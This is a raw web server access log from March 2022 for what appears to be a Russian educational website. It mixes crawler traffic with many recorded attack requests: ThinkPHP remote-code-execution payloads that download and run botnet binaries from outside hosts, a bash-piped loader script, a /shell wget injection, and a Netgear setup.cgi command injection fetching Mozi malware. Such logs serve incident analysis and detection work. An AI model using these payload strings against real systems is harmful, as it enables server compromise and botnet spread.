37.0.8.109 - - [16/Mar/2022:03:39:48 +0300] "GET /config/getuser?index=0 HTTP/1.1" 400 271 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
27.124.5.112 - - [16/Mar/2022:04:09:36 +0300] "GET / HTTP/1.1" 301 185 "-" "-" "-"
27.124.5.112 - - [16/Mar/2022:04:10:12 +0300] "GET /favicon.ico HTTP/1.1" 301 185 "-" "Go-http-client/1.1" "-"
27.124.5.112 - - [16/Mar/2022:04:10:18 +0300] "GET /favicon.ico HTTP/1.1" 404 169 "http://95.213.169.158/favicon.ico" "Go-http-client/1.1" "-"
27.124.5.112 - - [16/Mar/2022:04:10:22 +0300] "GET /robots.txt HTTP/1.1" 301 185 "-" "Go-http-client/1.1" "-"
27.124.5.112 - - [16/Mar/2022:04:10:35 +0300] "GET /robots.txt HTTP/1.1" 404 169 "http://95.213.169.158/robots.txt" "Go-http-client/1.1" "-"
27.124.5.112 - - [16/Mar/2022:04:10:41 +0300] "GET /sitemap.xml HTTP/1.1" 301 185 "-" "Go-http-client/1.1" "-"
95.163.255.56 - - [16/Mar/2022:04:18:06 +0300] "GET /robots.txt HTTP/1.0" 404 169 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Fast/2.0; +http://go.mail.ru/help/robots)" "-"
95.163.255.58 - - [16/Mar/2022:04:18:07 +0300] "GET /media/filer_public/b2/6d/b26d27f2-f5e7-4188-89b2-4922dc7393f6/9-4_python.pdf HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Fast/2.0; +http://go.mail.ru/help/robots)" "-"
95.163.255.52 - - [16/Mar/2022:04:18:08 +0300] "GET /media/filer_public/a1/91/a191fab0-1b8c-4c1e-a54e-adeebc1afde6/8-3_python.pdf HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Fast/2.0; +http://go.mail.ru/help/robots)" "-"
152.32.245.19 - - [16/Mar/2022:04:23:14 +0300] "GET / HTTP/1.1" 301 185 "-" "curl/7.29.0" "-"
123.57.212.216 - - [16/Mar/2022:04:23:52 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
87.250.224.125 - - [16/Mar/2022:04:27:36 +0300] "GET /?yclid=7710547526903176844 HTTP/1.1" 200 104259 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots yabs01)" "-"
71.163.139.66 - - [16/Mar/2022:04:28:26 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
111.13.63.71 - - [16/Mar/2022:04:33:17 +0300] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" "-"
111.13.63.71 - - [16/Mar/2022:04:33:18 +0300] "GET / HTTP/1.1" 404 571 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" "-"
111.13.63.71 - - [16/Mar/2022:04:33:19 +0300] "GET /favicon.ico HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" "-"
111.13.63.71 - - [16/Mar/2022:04:33:20 +0300] "GET //.well-known/security.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" "-"
111.13.63.71 - - [16/Mar/2022:04:33:20 +0300] "GET //sitemap.xml HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" "-"
111.13.63.71 - - [16/Mar/2022:04:33:20 +0300] "GET //robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36" "-"
184.105.139.68 - - [16/Mar/2022:04:43:02 +0300] "GET / HTTP/1.1" 301 185 "-" "-" "-"
117.160.202.52 - - [16/Mar/2022:04:45:36 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://107.173.222.135/bins/botnet.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 173 "-" "puzzles/2.0" "-"
5.45.207.95 - - [16/Mar/2022:04:53:02 +0300] "GET /ru/informatika/7-klass/ HTTP/1.1" 404 571 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.268" "-"
66.249.89.28 - - [16/Mar/2022:04:54:54 +0300] "GET /?utm_source=google&utm_medium=cpc&utm_campaign=13785458637&utm_content=122786977805&utm_term=%D0%B9%D0%BE%D1%80%D0%BA%20%D1%81%D1%82%D1%80%D0%B8%D0%B6%D0%BA%D0%B0 HTTP/1.1" 200 104259 "-" "AdsBot-Google (+http://www.google.com/adsbot.html)" "-"
45.137.21.166 - - [16/Mar/2022:04:57:04 +0300] "GET /config/getuser?index=0 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
50.199.41.242 - - [16/Mar/2022:05:01:27 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
139.196.188.71 - - [16/Mar/2022:05:01:59 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+209.141.59.94/jaws;sh+/tmp/jaws HTTP/1.1" 404 169 "-" "Hello, world" "-"
89.197.45.84 - - [16/Mar/2022:05:03:00 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://payload.krakenbit.net/596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.x86 -O /tmp/.db0fa4b8db0333367e9bda3ab68b8042; chmod 777 /tmp/.db0fa4b8db0333367e9bda3ab68b8042; /tmp/.db0fa4b8db0333367e9bda3ab68b8042 thinkphp' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
87.250.224.125 - - [16/Mar/2022:05:03:07 +0300] "GET /?yclid=7710547526903176844 HTTP/1.1" 200 104259 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots yabs01)" "-"
87.250.224.51 - - [16/Mar/2022:05:10:37 +0300] "GET /ru/podgotovka_ege/ HTTP/1.1" 404 571 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.268" "-"
45.137.21.166 - - [16/Mar/2022:05:13:34 +0300] "GET /config/getuser?index=0 HTTP/1.1" 301 185 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
46.214.85.176 - - [16/Mar/2022:05:24:33 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://ip/bins/Rubify.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp Rubify.ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
91.209.24.39 - - [16/Mar/2022:05:33:02 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='(curl 188.132.179.254/ldr.sh||wget -q -O- http://188.132.179.254/ldr.sh)|bash' HTTP/1.1" 400 173 "-" "Uirusu/2.0" "-"
192.99.18.136 - - [16/Mar/2022:05:33:32 +0300] "GET / HTTP/1.1" 200 104202 "https://www.google.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1" "-"
192.99.18.136 - - [16/Mar/2022:05:33:33 +0300] "GET /js/common.js HTTP/1.1" 200 23451 "https://www.google.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1" "-"
192.99.18.136 - - [16/Mar/2022:05:33:35 +0300] "GET /works HTTP/1.1" 200 9618 "https://www.google.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1" "-"
192.99.18.136 - - [16/Mar/2022:05:33:35 +0300] "GET /price HTTP/1.1" 200 52722 "https://www.google.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1" "-"
192.99.18.136 - - [16/Mar/2022:05:33:35 +0300] "GET /review HTTP/1.1" 200 6905 "https://www.google.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1" "-"
192.99.18.136 - - [16/Mar/2022:05:33:36 +0300] "GET /contacts HTTP/1.1" 200 6833 "https://www.google.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/77.0.3865.93 Mobile/15E148 Safari/605.1" "-"
87.250.224.125 - - [16/Mar/2022:05:40:26 +0300] "GET /?yclid=7710547526903176844 HTTP/1.1" 200 104259 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots yabs01)" "-"
103.111.111.166 - - [16/Mar/2022:05:46:36 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
95.163.255.126 - - [16/Mar/2022:05:48:35 +0300] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" "-"
95.163.36.9 - - [16/Mar/2022:05:49:10 +0300] "GET /ru/informatika/10-klass HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Fast/2.0; +https://help.mail.ru/webmaster/indexing/robots)" "-"
23.95.100.141 - - [16/Mar/2022:05:50:58 +0300] "POST /boaform/admin/formLogin HTTP/1.1" 301 185 "http://95.213.169.134:80/admin/login.asp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/71.0" "-"
23.95.100.141 - - [16/Mar/2022:05:50:58 +0300] "" 400 0 "-" "-" "-"
125.43.32.41 - - [16/Mar/2022:05:52:03 +0300] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.43.32.41:60317/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 301 185 "-" "-" "-"
216.218.97.239 - - [16/Mar/2022:05:52:43 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
103.88.237.141 - - [16/Mar/2022:05:53:26 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
2.56.57.187 - - [16/Mar/2022:06:00:49 +0300] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
77.79.7.144 - - [16/Mar/2022:06:04:20 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://payload.krakenbit.net/596a96cc7bf9108cd896f33c44aedc8a/db0fa4b8db0333367e9bda3ab68b8042.x86 -O /tmp/.db0fa4b8db0333367e9bda3ab68b8042; chmod 777 /tmp/.db0fa4b8db0333367e9bda3ab68b8042; /tmp/.db0fa4b8db0333367e9bda3ab68b8042 thinkphp' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
193.118.53.210 - - [16/Mar/2022:06:07:51 +0300] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" "-"
193.118.53.210 - - [16/Mar/2022:06:07:52 +0300] "GET / HTTP/1.1" 404 571 "http://95.213.169.158/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" "-"
66.249.65.171 - - [16/Mar/2022:06:09:47 +0300] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.65.173 - - [16/Mar/2022:06:09:47 +0300] "GET /media/filer_public/af/c0/afc045de-744f-4912-af05-7551d249e0b8/8zadachi.pdf HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
185.61.92.66 - - [16/Mar/2022:06:13:10 +0300] "GET /wp-login.php HTTP/1.1" 404 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
92.242.36.2 - - [16/Mar/2022:06:14:55 +0300] "GET /ru/informatika/10-klass HTTP/1.1" 404 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" "-"
199.117.152.51 - - [16/Mar/2022:06:16:39 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
87.250.224.125 - - [16/Mar/2022:06:16:55 +0300] "GET /?yclid=7710547526903176844 HTTP/1.1" 200 104259 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots yabs01)" "-"
173.70.157.133 - - [16/Mar/2022:06:18:36 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
77.68.243.98 - - [16/Mar/2022:06:21:48 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
184.67.104.54 - - [16/Mar/2022:06:24:29 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
209.124.101.102 - - [16/Mar/2022:06:25:11 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
164.52.24.177 - - [16/Mar/2022:06:28:43 +0300] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03\xFE\x9E\xFD>\x1A}\xE8\x8E\x1E\x06\xA25r\xB3\xE2&\xB0\xA7\x94K\xC8WTI\xEA\xDDsY\xE7\xE5j\xFC \x1C1\x08\xEC0\xC2J@\xE2\xFD\xE0\x17\xAC\xD5Wm\xA0\xA25@\x1E\x1B%\xABY\xF6\xDE\xCD\xBB\xA0\x81\x06\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 173 "-" "-" "-"
164.52.24.177 - - [16/Mar/2022:06:28:43 +0300] "\x16\x03\x01\x00\xBD\x01\x00\x00\xB9\x03\x03\xB8\xA5\xBFU\xB8t\xFEF8c\xD2I\xE4\xDD\xC3\xDA\xA5\xF2\x8C\x97\xC9\xBE\x19Cv`\xB7\xCF\xE9\x02F\x01\x00\x008\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 173 "-" "-" "-"
164.52.24.177 - - [16/Mar/2022:06:28:44 +0300] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x02\xD89V\x11\xC4\xFB\xC0" 400 173 "-" "-" "-"
164.52.24.177 - - [16/Mar/2022:06:28:44 +0300] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x01\x15\xF1\xC7E\x01\xA8\x99\xE8H[\xEA\xE1\xFF" 400 173 "-" "-" "-"
164.52.24.177 - - [16/Mar/2022:06:28:55 +0300] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0" "-"
164.52.24.177 - - [16/Mar/2022:06:29:03 +0300] "GET / HTTP/1.1" 200 104202 "http://95.213.169.134/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0" "-"
164.52.24.177 - - [16/Mar/2022:06:29:06 +0300] "GET / HTTP/1.1" 200 104202 "http://95.213.169.134/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0" "-"
190.120.15.10 - - [16/Mar/2022:06:31:39 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
23.95.100.141 - - [16/Mar/2022:06:32:07 +0300] "POST /boaform/admin/formLogin HTTP/1.1" 301 185 "http://95.213.169.158:80/admin/login.asp" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/71.0" "-"
23.95.100.141 - - [16/Mar/2022:06:32:08 +0300] "" 400 0 "-" "-" "-"
135.181.212.177 - - [16/Mar/2022:06:40:12 +0300] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" "-"
135.181.212.177 - - [16/Mar/2022:06:40:15 +0300] "GET /ru/fizika/8-klass/ HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" "-"
135.181.212.177 - - [16/Mar/2022:06:40:18 +0300] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" "-"
135.181.212.177 - - [16/Mar/2022:06:40:22 +0300] "GET /ru/informatika/11-klass/ HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" "-"
120.76.229.217 - - [16/Mar/2022:06:45:16 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://198.98.55.83/bns/gang123isgodloluaintgettingthesebinslikedammwtf.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ; rm -rf thinkphp' HTTP/1.1" 400 173 "-" "puzzles/2.0" "-"
192.241.222.207 - - [16/Mar/2022:06:45:22 +0300] "GET /ReportServer HTTP/1.1" 404 169 "-" "Mozilla/5.0 zgrab/0.x" "-"
192.241.222.207 - - [16/Mar/2022:06:46:09 +0300] "GET /ReportServer HTTP/1.1" 404 169 "-" "Mozilla/5.0 zgrab/0.x" "-"
157.55.39.62 - - [16/Mar/2022:06:48:05 +0300] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.204 - - [16/Mar/2022:06:48:10 +0300] "GET /ru/informatika/7-klass/ HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
87.250.224.125 - - [16/Mar/2022:06:51:32 +0300] "GET /?yclid=7710547526903176844 HTTP/1.1" 200 104259 "-" "Mozilla/5.0 (compatible; YandexMetrika/2.0; +http://yandex.com/bots yabs01)" "-"
71.6.232.4 - - [16/Mar/2022:06:53:29 +0300] "GET / HTTP/1.1" 301 185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" "-"
192.241.225.116 - - [16/Mar/2022:06:55:46 +0300] "GET /login HTTP/1.1" 404 169 "-" "Mozilla/5.0 zgrab/0.x" "-"
190.195.164.61 - - [16/Mar/2022:07:02:32 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
50.201.150.194 - - [16/Mar/2022:07:10:21 +0300] "GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://146.0.75.242/YourName/BinName.x86 -O /tmp/.Fdp; chmod 777 /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/1.1" 400 173 "-" "Tsunami/2.0" "-"
